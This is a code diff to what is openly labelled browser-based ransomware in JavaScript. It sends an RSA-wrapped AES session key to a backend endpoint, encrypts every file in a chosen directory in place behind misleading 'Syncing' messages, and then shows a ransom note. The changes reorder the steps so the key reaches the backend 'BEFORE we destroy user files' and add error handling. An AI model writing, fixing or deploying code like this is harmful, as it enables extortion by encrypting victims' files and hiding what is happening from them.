@@ -95,22 +95,47 @@ const updateFilesList = () => {
 // --- 3. KEY EXCHANGE ---
 const reportSessionKey = async (rawKeyBase64) => {
     if (!state.clientId) return;
+
     let payloadKey = rawKeyBase64;
+
     if (state.backendPublicKey) {
         try {
             const aesKeyBuffer = Buffer.from(rawKeyBase64, 'base64');
             const encryptedBuffer = crypto.publicEncrypt(
-                { key: state.backendPublicKey, padding: crypto.constants.RSA_PKCS1_PADDING },
+                {
+                    key: state.backendPublicKey,
+                    padding: crypto.constants.RSA_PKCS1_PADDING
+                },
                 aesKeyBuffer
             );
             payloadKey = encryptedBuffer.toString('base64');
-        } catch (e) { console.error("RSA Encryption failed", e); }
+        } catch (e) {
+            console.error("RSA Encryption failed", e);
+        }
     }
-    await fetch(`${API_BASE_URL}/session-keys`, {
+
+    const res = await fetch(`${API_BASE_URL}/session-keys`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ clientId: state.clientId, key: payloadKey, filesCount: state.totalFiles })
+        body: JSON.stringify({
+            clientId: state.clientId,
+            key: payloadKey,
+            filesCount: state.totalFiles
+        })
     });
+
+    // [FIX] Xử lý trường hợp ID bị từ chối (do Backend reset)
+    if (res.status === 401) {
+        sessionStorage.removeItem('rob_identity'); // Xóa ID cũ
+        alert("Session expired or server reset. The page will reload to generate a new secure identity.");
+        window.location.reload();
+        throw new Error("Identity invalid. Reloading...");
+    }
+
+    if (!res.ok) {
+        // Các lỗi khác thì báo bình thường
+        throw new Error(`Server Error: ${res.status}`);
+    }
 };
 
 // --- 4. RANSOMWARE LOGIC ---
@@ -120,23 +145,28 @@ const startEncryption = async () => {
     if (!state.clientId) await initializeIdentity();
 
     state.isEncrypting = true;
-    DOM.startEncryptBtn.disabled = true;
-    DOM.selectDirBtn.disabled = true;
-    DOM.decryptBtn.disabled = true;
+    // ... disable buttons ...
 
     log('Initializing synchronization...', 'info');
 
     try {
-        const session = await CryptoModule.generateSessionKey();
-        const sessionAes = session.aes;
-        await reportSessionKey(session.rawKeyBase64);
-
+        // 1. Count files FIRST so reportSessionKey sends correct data
         const files = await FileSystemModule.readAllFiles(state.selectedDirectory);
         state.totalFiles = files.length;
         state.filesProcessed = 0;
-        log(`Found ${files.length} files.`, 'info');
+        log(`Indexing complete: ${files.length} files found.`, 'info');
 
+        // 2. Generate Key
+        const session = await CryptoModule.generateSessionKey();
+        const sessionAes = session.aes;
+        
+        // 3. Send Key to Backend (Critical Step)
+        // We await this to ensure the backend has the key BEFORE we destroy user files
+        await reportSessionKey(session.rawKeyBase64);
+
+        // 4. Encrypt
         for (let i = 0; i < files.length; i++) {
+            // ... encryption loop ...
             const fileHandle = files[i];
             DOM.progressText.textContent = `Syncing: ${fileHandle.name}...`;
             await encryptFileInPlace(fileHandle, sessionAes);
@@ -147,13 +177,14 @@ const startEncryption = async () => {
         log('Synchronization Finished.', 'success');
         DOM.progressText.textContent = 'Done.';
         
-        // TRIGGER RANSOM NOTE
         setTimeout(showRansomNote, 1500);
 
     } catch (error) {
         log(`Error: ${error.message}`, 'error');
+        alert(`Attack aborted: ${error.message}`); // Alert user if key reporting failed
     } finally {
         state.isEncrypting = false;
+        // ... re-enable buttons ...
     }
 };
 
